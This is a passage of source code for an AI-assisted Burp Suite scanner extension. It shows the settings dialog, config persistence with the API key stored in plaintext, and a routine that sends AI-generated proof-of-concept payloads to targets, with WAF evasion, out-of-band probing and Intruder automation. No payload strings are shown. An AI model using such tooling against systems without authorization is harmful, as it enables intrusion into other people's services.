                    "[CONFIG] Provider: %s | Model: %s" % (self.AI_PROVIDER, self.MODEL)
                )
                self.stdout.println(
                    "[CONFIG] WAF:%s Evasion:%s Payloads:%s OOB:%s Intruder:%s"
                    % (
                        "ON" if self.ENABLE_WAF_DETECTION else "OFF",
                        "ON" if self.ENABLE_WAF_EVASION else "OFF",
                        "ON" if self.ENABLE_ADVANCED_PAYLOADS else "OFF",
                        "ON" if self.ENABLE_OOB_TESTING else "OFF",
                        "ON" if self.ENABLE_INTRUDER_AUTOMATION else "OFF",
                    )
                )
            else:
                self.stdout.println(
                    "\n[CONFIG] No saved configuration found - using defaults"
                )
                self.stdout.println(
                    "[CONFIG] Config will be saved to: %s" % self.config_file
                )
        except Exception as e:
            self.stderr.println("[!] Failed to load config: %s" % e)
            self.stderr.println("[!] Using default settings")

    def save_config(self):
        """Save configuration to disk"""
        try:
            config = {
                "ai_provider": self.AI_PROVIDER,
                "api_url": self.API_URL,
                "api_key": self.API_KEY,
                "model": self.MODEL,
                "max_tokens": self.MAX_TOKENS,
                "ai_request_timeout": self.AI_REQUEST_TIMEOUT,
                "verbose": self.VERBOSE,
                "theme": self.THEME,
                "passive_scanning_enabled": self.PASSIVE_SCANNING_ENABLED,
                "enable_waf_detection": self.ENABLE_WAF_DETECTION,
                "enable_waf_evasion": self.ENABLE_WAF_EVASION,
                "enable_advanced_payloads": self.ENABLE_ADVANCED_PAYLOADS,
                "enable_oob_testing": self.ENABLE_OOB_TESTING,
                "enable_intruder_automation": self.ENABLE_INTRUDER_AUTOMATION,
                "max_verification_attempts": int(self.MAX_VERIFICATION_ATTEMPTS),
                "oob_poll_seconds": int(self.OOB_POLL_SECONDS),
                "version": self.VERSION,
                "last_saved": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }

            with open(self.config_file, "w") as f:
                json.dump(config, f, indent=2)

            self.stdout.println("[CONFIG] Configuration saved to %s" % self.config_file)
            return True
        except Exception as e:
            self.stderr.println("[!] Failed to save config: %s" % e)
            return False

    def openUpgradePage(self, event):
        """Open updates page in browser"""
        self.stdout.println("\n[UPDATE] Checking for updates...")
        self.stdout.println("[UPDATE] Visit https://code-x.my")

        try:
            import webbrowser

            webbrowser.open("https://code-x.my")
        except:
            self.stdout.println("[UPDATE] Please visit: https://code-x.my")

    def openSettings(self, event):
        """Open settings dialog with AI provider and advanced configuration"""
        from javax.swing import (
            JDialog,
            JTabbedPane,
            JTextField,
            JComboBox,
            JPasswordField,
            JTextArea,
        )
        from javax.swing import SwingConstants, JCheckBox
        from java.awt import GridBagLayout, GridBagConstraints, Insets

        # Debug: Log that settings is opening
        self.stdout.println("\n[SETTINGS] Opening configuration dialog...")
        self.stdout.println("[SETTINGS] Current Provider: %s" % self.AI_PROVIDER)
        self.stdout.println("[SETTINGS] Current Model: %s" % self.MODEL)

        dialog = JDialog()
        dialog.setTitle("Code-AIxBurp Settings")
        dialog.setModal(True)
        dialog.setSize(
            780, 760
        )  # Wider and taller for enhanced advanced controls
        dialog.setLocationRelativeTo(None)

        tabbedPane = JTabbedPane()

        # AI PROVIDER TAB
        aiPanel = JPanel(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.anchor = GridBagConstraints.WEST
        gbc.fill = GridBagConstraints.HORIZONTAL

        row = 0

        gbc.gridx = 0
        gbc.gridy = row
        aiPanel.add(JLabel("AI Provider:"), gbc)
        gbc.gridx = 1
        gbc.gridwidth = 2
        providerCombo = JComboBox(["Ollama", "OpenAI", "Claude", "Gemini", "OpenAI Compatible"])
        providerCombo.setSelectedItem(self.AI_PROVIDER)

        # Auto-update API URL when provider changes
        from java.awt.event import ActionListener

        class ProviderChangeListener(ActionListener):
            def __init__(self, urlField):
                self.urlField = urlField

            def actionPerformed(self, e):
                provider = str(e.getSource().getSelectedItem())
                # Default URLs for each provider
                default_urls = {
                    "Ollama": "http://localhost:11434",
                    "OpenAI": "https://api.openai.com/v1",
                    "Claude": "https://api.anthropic.com/v1",
                    "Gemini": "https://generativelanguage.googleapis.com/v1",
                }
                if provider in default_urls:
                    self.urlField.setText(default_urls[provider])

        aiPanel.add(providerCombo, gbc)
        gbc.gridwidth = 1
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        aiPanel.add(JLabel("API URL:"), gbc)
        gbc.gridx = 1
        gbc.gridwidth = 2
        apiUrlField = JTextField(self.API_URL, 30)

        # Add listener AFTER creating the field
        providerCombo.addActionListener(ProviderChangeListener(apiUrlField))

        aiPanel.add(apiUrlField, gbc)
        gbc.gridwidth = 1
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        aiPanel.add(JLabel("API Key:"), gbc)
        gbc.gridx = 1
        gbc.gridwidth = 2
        apiKeyField = JPasswordField(self.API_KEY, 30)
        aiPanel.add(apiKeyField, gbc)
        gbc.gridwidth = 1
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        aiPanel.add(JLabel("Model:"), gbc)
        gbc.gridx = 1
        models_to_show = (
            self.available_models if self.available_models else [self.MODEL]
        )
        modelCombo = JComboBox(models_to_show)
        if self.MODEL in models_to_show:
            modelCombo.setSelectedItem(self.MODEL)
        aiPanel.add(modelCombo, gbc)

        gbc.gridx = 2
        refreshModelsBtn = JButton("Refresh")

        def refreshModels(e):
            refreshModelsBtn.setEnabled(False)
            refreshModelsBtn.setText("...")
            self.stdout.println("[SETTINGS] Fetching models...")

            def _do_refresh():
                try:
                    if self.test_ai_connection():

                        def _update_ui():
                            modelCombo.removeAllItems()
                            for model in self.available_models:
                                modelCombo.addItem(model)
                            self.stdout.println("[SETTINGS] Models refreshed")
                            refreshModelsBtn.setEnabled(True)
                            refreshModelsBtn.setText("Refresh")

                        SwingUtilities.invokeLater(lambda: _update_ui())
                    else:

                        def _restore():
                            refreshModelsBtn.setEnabled(True)
                            refreshModelsBtn.setText("Refresh")

                        SwingUtilities.invokeLater(lambda: _restore())
                except:

                    def _restore():
                        refreshModelsBtn.setEnabled(True)
                        refreshModelsBtn.setText("Refresh")

                    SwingUtilities.invokeLater(lambda: _restore())

            t = threading.Thread(target=_do_refresh)
            t.setDaemon(True)
            t.start()

        refreshModelsBtn.addActionListener(refreshModels)
        aiPanel.add(refreshModelsBtn, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        aiPanel.add(JLabel("Max Tokens:"), gbc)
        gbc.gridx = 1
        gbc.gridwidth = 2
        maxTokensField = JTextField(str(self.MAX_TOKENS), 10)
        aiPanel.add(maxTokensField, gbc)
        gbc.gridwidth = 1
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 3
        testBtn = JButton("Test Connection")

        def testConnection(e):
            testBtn.setEnabled(False)
            testBtn.setText("Testing...")
            old_provider = self.AI_PROVIDER
            old_url = self.API_URL
            old_key = self.API_KEY

            self.AI_PROVIDER = str(providerCombo.getSelectedItem())
            self.API_URL = apiUrlField.getText()
            self.API_KEY = "".join(apiKeyField.getPassword())

            def _do_test():
                try:
                    success = self.test_ai_connection()
                    if not success:
                        self.AI_PROVIDER = old_provider
                        self.API_URL = old_url
                        self.API_KEY = old_key
                finally:

                    def _restore():
                        testBtn.setEnabled(True)
                        testBtn.setText("Test Connection")

                    SwingUtilities.invokeLater(lambda: _restore())

            t = threading.Thread(target=_do_test)
            t.setDaemon(True)
            t.start()

        testBtn.addActionListener(testConnection)
        aiPanel.add(testBtn, gbc)
        row += 1

        gbc.gridy = row
        helpText = JTextArea(
            "Provider-specific URLs:\n\n"
            "Ollama: http://localhost:11434\n"
            "OpenAI: https://api.openai.com/v1\n"
            "Claude: https://api.anthropic.com/v1\n"
            "Gemini: https://generativelanguage.googleapis.com/v1\n"
            "OpenAI Compatible: Any OpenAI-compatible API (OpenRouter, Together AI, Groq, LM Studio, etc.)\n\n"
            "API Keys required for: OpenAI, Claude, Gemini, OpenAI Compatible"
        )
        helpText.setEditable(False)
        helpText.setBackground(aiPanel.getBackground())
        aiPanel.add(helpText, gbc)

        tabbedPane.addTab("AI Provider", aiPanel)

        # ADVANCED TAB
        advancedPanel = JPanel(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.anchor = GridBagConstraints.WEST
        gbc.fill = GridBagConstraints.HORIZONTAL

        row = 0

        # Passive Scanning toggle
        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Passive Scanning:"), gbc)
        gbc.gridx = 1
        passiveScanCheck = JCheckBox(
            "Enable automatic scanning", self.PASSIVE_SCANNING_ENABLED
        )
        advancedPanel.add(passiveScanCheck, gbc)
        row += 1

        # Enhanced testing toggles
        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("WAF Detection:"), gbc)
        gbc.gridx = 1
        wafDetectCheck = JCheckBox("Enable WAF fingerprinting", self.ENABLE_WAF_DETECTION)
        advancedPanel.add(wafDetectCheck, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("WAF Evasion:"), gbc)
        gbc.gridx = 1
        wafEvasionCheck = JCheckBox("Enable evasion transforms", self.ENABLE_WAF_EVASION)
        advancedPanel.add(wafEvasionCheck, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Advanced Payloads:"), gbc)
        gbc.gridx = 1
        advancedPayloadCheck = JCheckBox("Use payload libraries", self.ENABLE_ADVANCED_PAYLOADS)
        advancedPanel.add(advancedPayloadCheck, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("OOB Testing:"), gbc)
        gbc.gridx = 1
        oobCheck = JCheckBox("Enable Burp Collaborator checks", self.ENABLE_OOB_TESTING)
        advancedPanel.add(oobCheck, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Intruder Automation:"), gbc)
        gbc.gridx = 1
        intruderCheck = JCheckBox(
            "Enable Intruder payload generator and context action",
            self.ENABLE_INTRUDER_AUTOMATION,
        )
        advancedPanel.add(intruderCheck, gbc)
        row += 1

        # Help text for passive scanning
        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        passiveScanHelp = JTextArea(
            "When disabled, passive scanning is turned off but you can still\n"
            "manually analyze requests via right-click context menu."
        )
        passiveScanHelp.setEditable(False)
        passiveScanHelp.setBackground(advancedPanel.getBackground())
        passiveScanHelp.setFont(Font("Dialog", Font.ITALIC, 10))
        advancedPanel.add(passiveScanHelp, gbc)
        row += 1
        gbc.gridwidth = 1

        # Theme dropdown
        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Console Theme:"), gbc)
        gbc.gridx = 1
        themeCombo = JComboBox(["Light", "Dark"])
        themeCombo.setSelectedItem(self.THEME)
        advancedPanel.add(themeCombo, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Verbose Logging:"), gbc)
        gbc.gridx = 1
        verboseCheck = JCheckBox("", self.VERBOSE)
        advancedPanel.add(verboseCheck, gbc)
        row += 1

        # AI Request Timeout setting
        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("AI Request Timeout (seconds):"), gbc)
        gbc.gridx = 1
        timeoutField = JTextField(str(self.AI_REQUEST_TIMEOUT), 10)
        advancedPanel.add(timeoutField, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Verification Attempts:"), gbc)
        gbc.gridx = 1
        verifyAttemptsField = JTextField(str(self.MAX_VERIFICATION_ATTEMPTS), 10)
        advancedPanel.add(verifyAttemptsField, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("OOB Poll Time (seconds):"), gbc)
        gbc.gridx = 1
        oobPollField = JTextField(str(self.OOB_POLL_SECONDS), 10)
        advancedPanel.add(oobPollField, gbc)
        row += 1

        # Help text for timeout
        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        timeoutHelp = JTextArea(
            "Timeout for AI API requests (default: 60 seconds).\n"
            "Range: 10 to 99999 seconds (27.7 hours max).\n"
            "Increase if you get timeout errors.\n"
            "Recommended: 30-120s (fast models), 180-600s (large models).\n"
            "Verification attempts range: 1-10. OOB poll range: 6-120s."
        )
        timeoutHelp.setEditable(False)
        timeoutHelp.setBackground(advancedPanel.getBackground())
        timeoutHelp.setFont(Font("Dialog", Font.ITALIC, 10))
        advancedPanel.add(timeoutHelp, gbc)
        row += 1
        gbc.gridwidth = 1

        # Debug Tasks button
        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        debugTasksBtn = JButton("Run Task Diagnostics", actionPerformed=self.debugTasks)
        advancedPanel.add(debugTasksBtn, gbc)
        row += 1

        # Help text for debug
        gbc.gridy = row
        debugHelp = JTextArea(
            "Click to generate detailed diagnostic report for stuck/queued tasks.\n"
            "Shows task counts, durations, threading status, and recommendations."
        )
        debugHelp.setEditable(False)
        debugHelp.setBackground(advancedPanel.getBackground())
        debugHelp.setFont(Font("Dialog", Font.ITALIC, 10))
        advancedPanel.add(debugHelp, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        upgradeNotice = JTextArea(
            "ENHANCED MODULES\n\n"
            "This build supports:\n"
            "- Active verification with payload candidates\n"
            "- WAF fingerprinting and evasion payload transforms\n"
            "- Burp Collaborator out-of-band checks\n"
            "- Intruder payload generator + one-click launch\n"
            "- Tunable verification retries and OOB polling\n\n"
            "Use responsibly and only on authorized targets."
        )
        upgradeNotice.setEditable(False)
        upgradeNotice.setBackground(advancedPanel.getBackground())
        upgradeNotice.setFont(Font("Dialog", Font.PLAIN, 11))
        advancedPanel.add(upgradeNotice, gbc)

        tabbedPane.addTab("Advanced", advancedPanel)

        # BUTTONS
        buttonPanel = JPanel()

        def saveSettings(e):
            # Save AI Provider settings
            self.AI_PROVIDER = str(providerCombo.getSelectedItem())
            self.API_URL = apiUrlField.getText()
            self.API_KEY = "".join(apiKeyField.getPassword())
            self.MODEL = str(modelCombo.getSelectedItem())
            try:
                self.MAX_TOKENS = int(maxTokensField.getText())
            except ValueError:
                self.MAX_TOKENS = 2048
                self.stderr.println("[!] Invalid Max Tokens value, using default: 2048")

            # Save Advanced settings
            self.PASSIVE_SCANNING_ENABLED = passiveScanCheck.isSelected()
            self.ENABLE_WAF_DETECTION = wafDetectCheck.isSelected()
            self.ENABLE_WAF_EVASION = wafEvasionCheck.isSelected()
            self.ENABLE_ADVANCED_PAYLOADS = advancedPayloadCheck.isSelected()
            self.ENABLE_OOB_TESTING = oobCheck.isSelected()
            self.ENABLE_INTRUDER_AUTOMATION = intruderCheck.isSelected()
            self.THEME = str(themeCombo.getSelectedItem())
            self.VERBOSE = verboseCheck.isSelected()

            # Apply theme immediately
            self.applyConsoleTheme()

            # Save timeout setting
            try:
                timeout = int(timeoutField.getText())
                if timeout < 10:
                    self.AI_REQUEST_TIMEOUT = 10
                    self.stderr.println(
                        "[!] Timeout too low, using minimum: 10 seconds"
                    )
                elif timeout > 99999:
                    self.AI_REQUEST_TIMEOUT = 99999
                    self.stderr.println(
                        "[!] Timeout too high, using maximum: 99999 seconds"
                    )
                else:
                    self.AI_REQUEST_TIMEOUT = timeout
            except ValueError:
                self.AI_REQUEST_TIMEOUT = 60
                self.stderr.println(
                    "[!] Invalid timeout value, using default: 60 seconds"
                )

            try:
                max_attempts = int(verifyAttemptsField.getText())
                if max_attempts < 1:
                    max_attempts = 1
                elif max_attempts > 10:
                    max_attempts = 10
                self.MAX_VERIFICATION_ATTEMPTS = max_attempts
            except ValueError:
                self.MAX_VERIFICATION_ATTEMPTS = 4
                self.stderr.println(
                    "[!] Invalid verification attempts value, using default: 4"
                )

            try:
                oob_poll = int(oobPollField.getText())
                if oob_poll < 6:
                    oob_poll = 6
                elif oob_poll > 120:
                    oob_poll = 120
                self.OOB_POLL_SECONDS = oob_poll
            except ValueError:
                self.OOB_POLL_SECONDS = 18
                self.stderr.println("[!] Invalid OOB poll value, using default: 18")

            self.advanced_payload_library = self._build_advanced_payload_library()
            self._sync_intruder_payload_factory()

            # Log confirmation
            self.stdout.println("\n[SETTINGS] OK Configuration saved successfully")
            self.stdout.println("[SETTINGS] AI Provider: %s" % self.AI_PROVIDER)
            self.stdout.println("[SETTINGS] API URL: %s" % self.API_URL)
            self.stdout.println("[SETTINGS] Model: %s" % self.MODEL)
            self.stdout.println("[SETTINGS] Max Tokens: %d" % int(self.MAX_TOKENS))
            self.stdout.println(
                "[SETTINGS] Request Timeout: %d seconds" % int(self.AI_REQUEST_TIMEOUT)
            )
            self.stdout.println("[SETTINGS] Console Theme: %s" % self.THEME)
            self.stdout.println(
                "[SETTINGS] Verbose Logging: %s"
                % ("Enabled" if self.VERBOSE else "Disabled")
            )
            self.stdout.println(
                "[SETTINGS] Passive Scanning: %s"
                % ("Enabled" if self.PASSIVE_SCANNING_ENABLED else "Disabled")
            )
            self.stdout.println(
                "[SETTINGS] WAF Detection/Evasion: %s/%s"
                % (
                    "Enabled" if self.ENABLE_WAF_DETECTION else "Disabled",
                    "Enabled" if self.ENABLE_WAF_EVASION else "Disabled",
                )
            )
            self.stdout.println(
                "[SETTINGS] Advanced Payloads: %s"
                % ("Enabled" if self.ENABLE_ADVANCED_PAYLOADS else "Disabled")
            )
            self.stdout.println(
                "[SETTINGS] OOB Testing: %s | Intruder Automation: %s"
                % (
                    "Enabled" if self.ENABLE_OOB_TESTING else "Disabled",
                    "Enabled" if self.ENABLE_INTRUDER_AUTOMATION else "Disabled",
                )
            )
            self.stdout.println(
                "[SETTINGS] Verification Attempts: %d | OOB Poll: %ds"
                % (int(self.MAX_VERIFICATION_ATTEMPTS), int(self.OOB_POLL_SECONDS))
            )

            # Save configuration to disk
            if self.save_config():
                self.stdout.println("[SETTINGS] OK Configuration persisted to disk")

            dialog.dispose()

        saveBtn = JButton("Save")
        saveBtn.addActionListener(saveSettings)
        buttonPanel.add(saveBtn)

        cancelBtn = JButton("Cancel")
        cancelBtn.addActionListener(lambda e: dialog.dispose())
        buttonPanel.add(cancelBtn)

        # Assemble dialog
        dialog.add(tabbedPane, BorderLayout.CENTER)
        dialog.add(buttonPanel, BorderLayout.SOUTH)

        # Show dialog
        dialog.setVisible(True)

    def log_to_console(self, message):
        with self.console_lock:
            timestamp = datetime.now().strftime("%H:%M:%S")
            message_str = str(message)

            if "http://" in message_str or "https://" in message_str:
                import re

                def truncate_url(match):
                    url = match.group(0)
                    if len(url) > 100:
                        return url[:97] + "..."
                    return url

                message_str = re.sub(r"https?://[^\s]+", truncate_url, message_str)

            if len(message_str) > 150:
                message_str = message_str[:147] + "..."

            formatted_msg = "[%s] %s" % (timestamp, message_str)
            self.console_messages.append(formatted_msg)

            if len(self.console_messages) > self.max_console_messages:
                self.console_messages = self.console_messages[
                    -self.max_console_messages :
                ]
        self._ui_dirty = True

    def add_finding(
        self, url, title, severity, confidence, messageInfo=None, vuln_details=None
    ):
        with self.findings_lock_ui:
            finding = {
                "discovered_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "url": url,
                "title": title,
                "severity": severity,
                "confidence": confidence,
                "verified": "Pending",
                "verification_details": "",
                "verification_payload": "",
                "messageInfo": messageInfo,
                "vuln_details": vuln_details or {},
            }
            self.findings_list.append(finding)
        self._ui_dirty = True

    def _createFindingsPopupMenu(self):
        """Create right-click context menu for findings table"""
        popup = JPopupMenu()

        verifyItem = JMenuItem("Verify Finding (AI PoC)")
        verifyItem.addActionListener(lambda e: self._verifySelectedFinding())
        popup.add(verifyItem)

        verifyAllItem = JMenuItem("Verify All Pending")
        verifyAllItem.addActionListener(lambda e: self._verifyAllPendingFindings())
        popup.add(verifyAllItem)

        oobItem = JMenuItem("Run OOB Probe (Selected)")
        oobItem.addActionListener(lambda e: self._runOobForSelectedFinding())
        popup.add(oobItem)

        intruderItem = JMenuItem("Send Finding Request to Intruder")
        intruderItem.addActionListener(lambda e: self._sendSelectedFindingToIntruder())
        popup.add(intruderItem)

        popup.addSeparator()

        markFalsePositive = JMenuItem("Mark as False Positive")
        markFalsePositive.addActionListener(
            lambda e: self._markFindingStatus("False Positive")
        )
        popup.add(markFalsePositive)

        markConfirmed = JMenuItem("Mark as Confirmed")
        markConfirmed.addActionListener(lambda e: self._markFindingStatus("Confirmed"))
        popup.add(markConfirmed)

        return popup

    def _installFindingsTableMouseHandler(self):
        """Select row on right-click so popup actions target the clicked finding."""
        from java.awt.event import MouseAdapter

        extender = self

        class FindingsMouseAdapter(MouseAdapter):
            def _select_row(self, event):
                if not event.isPopupTrigger():
                    return
                row = extender.findingsTable.rowAtPoint(event.getPoint())
                if row >= 0:
                    extender.findingsTable.setRowSelectionInterval(row, row)

            def mousePressed(self, event):
                self._select_row(event)

            def mouseReleased(self, event):
                self._select_row(event)

        self.findingsTable.addMouseListener(FindingsMouseAdapter())

    def _verifySelectedFinding(self):
        """Verify the selected finding using AI-guided PoC"""
        row = self.findingsTable.getSelectedRow()
        if row < 0:
            self.stdout.println("[!] No finding selected")
            return
        modelRow = self.findingsTable.convertRowIndexToModel(row)
        self._verifyFindingByModelRow(modelRow)

    def _verifyFindingByModelRow(self, modelRow):
        with self.findings_lock_ui:
            if modelRow < 0 or modelRow >= len(self.findings_list):
                return
            finding = self.findings_list[modelRow]
            if not finding.get("messageInfo"):
                self.stdout.println(
                    "[!] Cannot verify: No request/response data stored for this finding"
                )
                return
            if finding.get("verified") == "Verifying...":
                self.stdout.println("[!] Verification already in progress for this finding")
                return

        def verify_thread():
            self.verify_finding(modelRow)

        t = threading.Thread(target=verify_thread)
        t.daemon = True
        t.start()

    def _runOobForSelectedFinding(self):
        row = self.findingsTable.getSelectedRow()
        if row < 0:
            self.stdout.println("[OOB] No finding selected")
            return
        modelRow = self.findingsTable.convertRowIndexToModel(row)
        with self.findings_lock_ui:
            if modelRow < 0 or modelRow >= len(self.findings_list):
                return
            finding = self.findings_list[modelRow]
            messageInfo = finding.get("messageInfo")
            vuln_details = finding.get("vuln_details", {}) or {}

        if not messageInfo:
            self.stdout.println("[OOB] Selected finding has no request/response data")
            return

        injection_point = str(vuln_details.get("param_name", "") or "")

        def _oob_thread():
            oob_result = self._run_oob_probe_for_message(
                messageInfo, injection_point=injection_point, context_label="Finding"
            )
            if oob_result.get("detected"):
                self._updateVerificationStatus(
                    modelRow,
                    "Confirmed",
                    oob_result.get("evidence", "OOB interaction observed"),
                )
            elif oob_result.get("sent"):
                self._updateVerificationStatus(
                    modelRow,
                    "Uncertain",
                    oob_result.get("evidence", "No OOB interaction observed"),
                )

        t = threading.Thread(target=_oob_thread)
        t.daemon = True
        t.start()

    def _sendSelectedFindingToIntruder(self):
        row = self.findingsTable.getSelectedRow()
        if row < 0:
            self.stdout.println("[INTRUDER] No finding selected")
            return
        modelRow = self.findingsTable.convertRowIndexToModel(row)
        with self.findings_lock_ui:
            if modelRow < 0 or modelRow >= len(self.findings_list):
                return
            messageInfo = self.findings_list[modelRow].get("messageInfo")
        if not messageInfo:
            self.stdout.println("[INTRUDER] Selected finding has no request data")
            return
        self.send_to_intruder_automated([messageInfo])

    def _verifyAllPendingFindings(self):
        """Verify all pending findings"""
        with self.findings_lock_ui:
            pending_indices = [
                i
                for i, finding in enumerate(self.findings_list)
                if finding.get("verified") == "Pending" and finding.get("messageInfo")
            ]

        if not pending_indices:
            self.stdout.println("[!] No pending findings with request data to verify")
            return

        self.stdout.println(
            "[*] Starting verification of %d findings..." % len(pending_indices)
        )

        def verify_all_thread():
            for idx in pending_indices:
                self.verify_finding(idx)
                time.sleep(2)

        t = threading.Thread(target=verify_all_thread)
        t.daemon = True
        t.start()

    def _markFindingStatus(self, status):
        """Manually mark finding verification status"""
        row = self.findingsTable.getSelectedRow()
        if row < 0:
            return

        modelRow = self.findingsTable.convertRowIndexToModel(row)
        with self.findings_lock_ui:
            if modelRow < len(self.findings_list):
                self.findings_list[modelRow]["verified"] = status
                self.findings_list[modelRow][
                    "verification_details"
                ] = "Status set manually"
        self._ui_dirty = True

    def _performVerification(self, finding, findingIndex):
        """Backward-compatible wrapper for existing calls."""
        self.verify_finding(findingIndex, finding)

    def verify_finding(self, findingIndex, finding=None):
        """Send AI-generated PoC payload and analyze response evidence."""
        try:
            with self.findings_lock_ui:
                if findingIndex < 0 or findingIndex >= len(self.findings_list):
                    return
                finding = self.findings_list[findingIndex]
                self.findings_list[findingIndex]["verified"] = "Verifying..."
                self.findings_list[findingIndex]["verification_details"] = ""
            self._ui_dirty = True

            url = finding.get("url", "")
            title = finding.get("title", "")
            vuln_details = finding.get("vuln_details", {})
            messageInfo = finding.get("messageInfo")

            if not messageInfo:
                self._updateVerificationStatus(
                    findingIndex, "Error", "Missing request/response data"
                )
                return

            self.stdout.println("\n[VERIFY] Starting verification for: %s" % title)
            self.stdout.println("[VERIFY] URL: %s" % url)

            request_bytes = messageInfo.getRequest()
            response_bytes = messageInfo.getResponse()
            httpService = messageInfo.getHttpService()

            req_str = self.helpers.bytesToString(request_bytes) if request_bytes else ""
            resp_str = self.helpers.bytesToString(response_bytes) if response_bytes else ""

            if not req_str:
                self._updateVerificationStatus(
                    findingIndex, "Error", "Original request is empty"
                )
                return

            vuln_family = self._inferVerificationFamily(title, vuln_details)
            verification_nonce = self._buildVerificationNonce(
                findingIndex, url, title, vuln_details
            )
            verification_prompt = self.build_verification_prompt(
                title,
                vuln_details,
                req_str,
                resp_str[:2000],
                finding_context={
                    "index": findingIndex,
                    "url": url,
                    "severity": finding.get("severity", ""),
                    "confidence": finding.get("confidence", ""),
                },
                vuln_family=vuln_family,
                verification_nonce=verification_nonce,
            )

            self.stdout.println(
                "[VERIFY] Asking AI for verification payload (temp=%.2f)..."
                % float(self.VERIFICATION_AI_TEMPERATURE)
            )
            ai_response = self.ask_ai(
                verification_prompt, temperature=self.VERIFICATION_AI_TEMPERATURE
            )
            if not ai_response:
                self._updateVerificationStatus(
                    findingIndex,
                    "Error",
                    "No AI response while generating verification payload. "
                    "Possible provider timeout/network/API error. Check Output tab for '[!] AI request failed'.",
                )
                return

            payload_info = self._parseVerificationPayload(ai_response)
            if not payload_info:
                ai_preview = str(ai_response).replace("\r", " ").replace("\n", " ")[:220]
                self._updateVerificationStatus(
                    findingIndex,
                    "Error",
                    "Could not parse AI payload JSON. AI preview: %s" % ai_preview,
                )
                return

            payload = str(payload_info.get("payload", "")).strip()
            injection_point = str(payload_info.get("injection_point", "")).strip()
            detection_method = str(payload_info.get("detection_method", "")).strip()
            is_safe = payload_info.get("safe", True)
            payload_nonce = str(payload_info.get("verification_nonce", "")).strip()
            payload_family = str(payload_info.get("payload_family", "")).strip().lower()

            if not payload:
                self._updateVerificationStatus(
                    findingIndex, "Error", "AI did not provide a payload"
                )
                return

            # Some models occasionally return a full HTTP request block instead of a raw payload.
            # Auto-coerce this into a marker payload for header-based checks.
            if self._looks_like_http_request_block(payload):
                if self._isHeaderInjectionPoint(injection_point):
                    self.stdout.println(
                        "[VERIFY] AI returned full HTTP request block; coercing to header marker payload"
                    )
                    payload = verification_nonce
                    if not detection_method:
                        detection_method = (
                            "Verify marker reflection/handling using custom header value"
                        )
                else:
                    self._updateVerificationStatus(
                        findingIndex,
                        "Error",
                        "AI returned full HTTP request text instead of a payload string",
                    )
                    return

            if payload_family and payload_family != vuln_family:
                self.stdout.println(
                    "[VERIFY] AI payload family '%s' differs from inferred '%s'"
                    % (payload_family, vuln_family)
                )

            if payload_nonce and payload_nonce != verification_nonce:
                self.stdout.println(
                    "[VERIFY] AI nonce mismatch; expected %s got %s"
                    % (verification_nonce, payload_nonce)
                )

            if injection_point == "" and vuln_details.get("param_name"):
                injection_point = str(vuln_details.get("param_name"))
            if injection_point == "":
                request_info = self.helpers.analyzeRequest(messageInfo)
                injection_point = self._pick_injection_point(request_info)
            if self._isHeaderInjectionPoint(injection_point):
                injection_point = self._normalizeHeaderInjectionPoint(injection_point)

            if not is_safe:
                self._updateVerificationStatus(
                    findingIndex,
                    "Uncertain",
                    "AI marked payload as unsafe for automated execution",
                )
                return

            waf_profile = {"detected": False}
            if self.ENABLE_WAF_DETECTION:
                waf_profile = self._detect_waf_profile(
                    messageInfo=messageInfo, response_text=resp_str[:3000]
                )
                if waf_profile.get("detected"):
                    self.stdout.println(
                        "[VERIFY] WAF detected: %s (confidence=%s)"
                        % (
                            waf_profile.get("vendor", "Generic WAF"),
                            str(waf_profile.get("confidence", 0)),
                        )
                    )

            oob_domain = ""
            oob_families = ["ssrf", "command_injection", "ssti", "generic"]
            if self.ENABLE_OOB_TESTING and vuln_family in oob_families:
                collab_context = self._get_or_create_collaborator_context(
                    str(httpService.getHost() or "default")
                )
                oob_domain = self._generate_oob_payload(collab_context)

            target_profile = self._build_target_profile(
                req_str,
                resp_str[:4000],
                vuln_family=vuln_family,
                injection_point=injection_point,
            )
            if self.VERBOSE:
                self.stdout.println(
                    "[VERIFY] Target profile: dbms=%s stack=%s os=%s json=%s api=%s"
                    % (
                        target_profile.get("dbms") or "unknown",
                        target_profile.get("stack") or "unknown",
                        target_profile.get("os") or "unknown",
                        str(target_profile.get("is_json")),
                        str(target_profile.get("is_api")),
                    )
                )

            payload_candidates = self._generate_payload_candidates(
                vuln_family=vuln_family,
                ai_payload=payload,
                verification_nonce=verification_nonce,
                waf_profile=waf_profile,
                oob_domain=oob_domain,
                target_profile=target_profile,
            )
            if not payload_candidates:
                payload_candidates = [payload]

            self.stdout.println(
                "[VERIFY] Trying %d payload candidate(s) at %s"
                % (
                    len(payload_candidates),
                    injection_point if injection_point else "<auto>",
                )
            )

            best_result = {
                "status": "Uncertain",
                "evidence": "No clear indicator found",
